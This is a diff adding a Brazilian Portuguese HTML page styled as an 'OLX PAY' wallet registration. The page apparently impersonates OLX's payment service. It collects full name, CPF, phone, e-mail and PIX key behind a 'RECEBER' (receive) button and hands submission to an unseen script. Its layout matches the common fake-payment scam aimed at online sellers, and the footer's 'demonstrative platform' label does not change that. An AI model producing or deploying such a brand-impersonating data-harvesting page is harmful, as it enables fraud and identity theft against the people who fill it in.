@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>OX PAY – Cadastro de Carteira</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+  <main class="card">
+    <img src="assets/images/illustration.png" class="hero-img" alt="Ilustração">
+
+    <h1>Cadastro de Carteira <span>OLX PAY</span></h1>
+    <p class="subtitle">
+      Complete seus dados para configurar sua forma de recebimento.
+    </p>
+
+    <form id="formDados" novalidate>
+
+      <label>Nome completo*
+        <input type="text" name="nome" placeholder="Nome completo" required>
+      </label>
+
+      <label>CPF*
+        <input type="text" name="cpf" placeholder="000.000.000-00" required>
+      </label>
+
+      <label>Telefone*
+        <input type="tel" name="telefone" placeholder="(00) 00000-0000" required>
+      </label>
+
+      <label>E-mail*
+        <input type="email" name="email" placeholder="Digite seu e-mail" required>
+      </label>
+
+      <fieldset>
+        <legend>Como deseja receber PIX*</legend>
+        <label><input type="checkbox" name="pixTipo" value="CPF"> CPF</label>
+        <label><input type="checkbox" name="pixTipo" value="Email"> E-mail</label>
+        <label><input type="checkbox" name="pixTipo" value="Telefone"> Telefone</label>
+        <label><input type="checkbox" name="pixTipo" value="Aleatoria"> Chave Aleatória</label>
+      </fieldset>
+
+      <label>Digite sua chave PIX*
+        <input type="text" name="pixChave" placeholder="Digite sua chave PIX" required>
+      </label>
+
+      <button type="submit">RECEBER</button>
+    </form>
+
+    <footer>
+      <p class="links">
+        Segurança · Termos de Uso · Política de Privacidade
+      </p>
+      <p class="copy">
+        © 2026 OX PAY – Plataforma demonstrativa
+      </p>
+    </footer>
+  </main>
+
+  <script src="js/script.js"></script>
+</body>
+</html>
